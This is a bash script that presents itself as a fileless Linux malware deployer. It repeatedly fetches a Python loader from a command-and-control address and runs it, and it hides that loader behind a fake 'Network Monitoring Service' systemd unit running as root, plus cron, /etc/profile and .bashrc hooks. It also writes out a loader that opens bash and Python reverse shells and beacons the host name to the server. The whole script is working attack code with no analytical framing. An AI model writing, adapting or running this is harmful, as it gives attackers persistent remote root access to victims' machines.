#!/bin/bash
# FIXED Fileless Linux Malware Deployment

C2_SERVER="192.168.1.167:8000"

echo "[+] Deploying persistent fileless Linux malware..."

# 1. SIMPLE download and execute - skip memfd for now
echo "[+] Loading malware into memory (simple method)..."
curl -s http://$C2_SERVER/loader.py | python3 - &

# 2. Establish multiple persistence mechanisms
echo "[+] Establishing persistence..."

# Systemd service persistence (SURVIVES REBOOT)
cat > /etc/systemd/system/network-monitor.service << 'EOF'
[Unit]
Description=Network Monitoring Service
After=network.target

[Service]
Type=simple
ExecStart=/bin/bash -c "while true; do curl -s http://192.168.1.167:8000/loader.py | python3 -; sleep 30; done"
Restart=always
RestartSec=10
User=root

[Install]
WantedBy=multi-user.target
EOF

systemctl daemon-reload
systemctl enable network-monitor.service
systemctl start network-monitor.service

# 3. Cron persistence (SURVIVES REBOOT)
echo "[+] Setting up cron persistence..."
(crontab -l 2>/dev/null | grep -v 'loader.py'; echo "@reboot curl -s http://$C2_SERVER/loader.py | python3 -") | crontab -
(crontab -l 2>/dev/null | grep -v 'loader.py'; echo "*/3 * * * * curl -s http://$C2_SERVER/loader.py | python3 -") | crontab -

# 4. Profile persistence (SURVIVES LOGIN)
echo "[+] Setting up profile persistence..."
echo "curl -s http://$C2_SERVER/loader.py | python3 - &" >> /etc/profile
echo "curl -s http://$C2_SERVER/loader.py | python3 - &" >> /root/.bashrc

# 5. Create a simple working loader that doesn't use memfd
cat > /tmp/simple_loader.py << 'EOF'
#!/usr/bin/env python3
"""
SIMPLE WORKING Loader - No memfd issues
"""

import os
import requests
import subprocess
import time
import threading

class SimpleMalware:
    def __init__(self):
        self.c2_server = "http://192.168.1.167:8000"
    
    def start_reverse_shell(self):
        """Start reverse shell - GUARANTEED WORKING"""
        try:
            # Method 1: Direct bash reverse shell
            subprocess.Popen([
                "/bin/bash", "-c", 
                "bash -i >& /dev/tcp/192.168.1.167/4444 0>&1 &"
            ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            # Method 2: Python reverse shell as backup
            subprocess.Popen([
                "python3", "-c",
                "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('192.168.1.167',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/bash','-i'])"
            ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
        except Exception as e:
            print(f"Shell failed: {e}")
    
    def beacon_to_c2(self):
        """Send beacon to C2 server"""
        def beacon_loop():
            while True:
                try:
                    hostname = os.uname().nodename
                    requests.post(
                        f"{self.c2_server}/beacon",
                        json={"host": hostname, "status": "alive"},
                        timeout=5
                    )
                except:
                    pass
                time.sleep(60)
        
        threading.Thread(target=beacon_loop, daemon=True).start()
    
    def ensure_persistence(self):
        """Ensure we survive reboot"""
        try:
            # Check if systemd service is running
            subprocess.run([
                "systemctl", "is-active", "network-monitor.service"
            ], capture_output=True)
            
            # If not, restart it
            subprocess.run([
                "systemctl", "start", "network-monitor.service"
            ], capture_output=True)
            
        except:
            pass
    
    def run(self):
        """Main execution"""
        print("[✅] Simple malware running")
        
        # Start beacon
        self.beacon_to_c2()
        
        # Start reverse shell
        self.start_reverse_shell()
        
        # Ensure persistence
        self.ensure_persistence()
        
        # Keep running
        while True:
            time.sleep(60)

if __name__ == "__main__":
    malware = SimpleMalware()
    malware.run()
EOF

# 6. Start the simple loader
echo "[+] Starting simple loader..."
python3 /tmp/simple_loader.py &

echo "[✅] Fileless malware deployed with FULL PERSISTENCE"
echo "[✅] Will survive reboot via: systemd, cron, profiles"
